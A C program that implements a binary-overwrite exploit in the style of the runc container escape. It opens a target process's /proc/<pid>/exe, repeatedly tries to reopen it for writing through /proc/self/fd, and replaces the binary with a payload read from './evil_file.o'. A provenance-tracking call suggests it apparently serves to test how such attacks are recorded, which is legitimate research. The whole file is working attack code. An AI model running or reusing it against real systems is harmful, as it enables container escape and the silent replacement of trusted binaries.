#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "provenance.h"

/* Simple Buffer*/
typedef struct Buffer
{
	int len;		// buffer length
	void * buff;	// buffer data
} Buffer;

#define FALSE 0
#define TRUE  1



const char * EVIL_FILE_PATH = "./evil_file.o";

const unsigned int PATH_MAX_LEN = 100;

const int OPEN_ERR = -1;
const int RET_ERR = 1;
const int RET_OK = 0;

const long WRITE_TIMEOUT = 99999999999999999;

Buffer read_evil_file( void );


/*
* Overwrites the my_file binary.
*/
int main(int argc, char *argv[])
{
	int my_file_fd_read, my_file_fd, wc;
	char my_file_fd_path[PATH_MAX_LEN];
	char my_file_exe_path[PATH_MAX_LEN];
	Buffer evil_file;
	FILE *fp_pid_file;

	if(provenance_set_tracked(true)){
		printf("Failed Tracking, error %d\n", errno);
		printf("%s\n\n",strerror(errno));
	}

	fp_pid_file = fopen("my_pid.txt", "r");
	fscanf(fp_pid_file, "%s", my_file_exe_path);

	if(fp_pid_file == NULL){
		printf("[!] open file err while opening the pid_file\n");
	  	return 0;
	}

	printf("[+] The /proc/pid/exe path of my_file is: %s\n", my_file_exe_path);
	fclose(fp_pid_file);


	/* Open /proc/my_file_pid/exe for reading */
	my_file_fd_read = open(my_file_exe_path, O_RDONLY);
	if (my_file_fd_read == OPEN_ERR)
	{
		printf("[!] Couldn't open my_file's exe %s\n", my_file_exe_path);
		perror("[!] Open");
		return RET_ERR;
	}
	printf("[+] Got %s as fd %d in this process\n", my_file_exe_path, my_file_fd_read);

	evil_file = read_evil_file();

	printf("[+] Read %d bytes from evil_file\n", evil_file.len);

	/* Try to open /proc/self/fd/my_file_fd_read for writing */
	/* Will Succeed after the my_file process exits          */
	sprintf(my_file_fd_path, "/proc/self/fd/%d", my_file_fd_read);
	int opened = FALSE;
	for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)
	{
		my_file_fd = open(my_file_fd_path, O_WRONLY | O_TRUNC);
		if (my_file_fd != OPEN_ERR)
		{
			wc = write(my_file_fd, evil_file.buff, evil_file.len);
			if (wc !=  evil_file.len)
			{
				printf("[!] Couldn't write to my process's my_file's fd %s\n", my_file_fd_path);
				close(my_file_fd);
				close(my_file_fd_read);
				free(evil_file.buff);
				return RET_ERR;
			}
			printf("[+] Opened my_file (using %s) for writing\n", my_file_fd_path);
			printf("[+] Succesfully overwritten my_file\n");
			opened = TRUE;
		}
	}

	/* Clean ups & return */
	close(my_file_fd);
	free(evil_file.buff);
	if (opened == FALSE)
	{
		printf("[!] Reached timeout, couldn't write to my_file at %s\n", my_file_fd_path);
		return RET_ERR;
	}
	else
		printf("[+] Done, shuting down ...\n");

	fflush(stdout);
	return RET_OK;

}


Buffer read_evil_file( void )
{
	Buffer evil_file = {0, NULL};
	FILE *fp_evil_file;
	int file_size, rc;
	void * evil_file_content;
	char ch;

	// open evil_file
	fp_evil_file = fopen(EVIL_FILE_PATH, "r"); // read mode
	if (fp_evil_file == NULL)
	{
	  printf("[!] open file err while opening the evil_file %s\n", EVIL_FILE_PATH);
	  return evil_file;
	}

	// Get file size and prepare buff
	fseek(fp_evil_file, 0L, SEEK_END);
	file_size = ftell(fp_evil_file);
	evil_file_content = malloc(file_size);
	rewind(fp_evil_file);

	rc = fread(evil_file_content, 1, file_size, fp_evil_file);
	if (rc != file_size)
	{
		printf("[!] Couldn't read from evil_file at %s\n", EVIL_FILE_PATH);
		free(evil_file_content);
		return evil_file;
	}

	fclose(fp_evil_file);
	evil_file.len = rc;
	evil_file.buff = evil_file_content;
	return evil_file;

}
